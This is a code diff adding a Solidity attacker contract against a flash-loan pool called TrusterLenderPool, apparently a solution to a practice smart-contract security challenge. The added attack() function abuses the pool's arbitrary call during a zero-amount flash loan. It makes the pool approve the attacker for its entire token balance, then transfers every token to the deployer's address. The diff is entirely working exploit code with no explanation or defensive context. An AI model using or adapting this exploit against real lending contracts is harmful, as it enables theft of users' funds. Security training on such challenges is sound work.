@@ -40,3 +40,26 @@ contract TrusterLenderPool is ReentrancyGuard {
     }
 
 }
+
+contract TrusterLenderPoolAttacker {
+
+    address private immutable _attackerAddress;
+    address private immutable _tokenAddress;
+    address private immutable _pool;
+
+    constructor(address tokenAddress, address pool) {
+        _attackerAddress = msg.sender;
+        _tokenAddress = tokenAddress;
+        _pool = pool;
+    }
+
+    function attack() public {
+        TrusterLenderPool(_pool).flashLoan(
+            0,
+            _attackerAddress,
+            _tokenAddress,
+            abi.encodeWithSignature("approve(address,uint256)", address(this), IERC20(_tokenAddress).balanceOf(_pool))
+        );
+        IERC20(_tokenAddress).transferFrom(_pool, _attackerAddress, IERC20(_tokenAddress).balanceOf(_pool));
+    }
+}
